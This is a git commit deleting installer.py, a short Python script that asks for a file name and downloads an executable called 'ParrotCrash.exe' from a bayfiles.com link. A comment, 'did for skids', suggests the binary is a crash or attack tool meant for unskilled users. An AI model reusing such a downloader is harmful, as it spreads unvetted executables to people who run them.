47cc6cd383a8d631f19c6af56bbcfc81910e621c
Vodkarm06 <79284263+Vodkarm@users.noreply.github.com>
2022-09-21 22:30:52 +0200

    Delete installer.py

--- installer.py
+++
@@ -1,7 +0,0 @@
-import urllib.request
-
-# did for skids <3
-
-name = input("Enter the file name that u want: ")
-urllib.request.urlretrieve("https://cdn-136.bayfiles.com/deN4Y68eyf/d0c77bd3-1663705117/ParrotCrash.exe", name + ".exe")
-
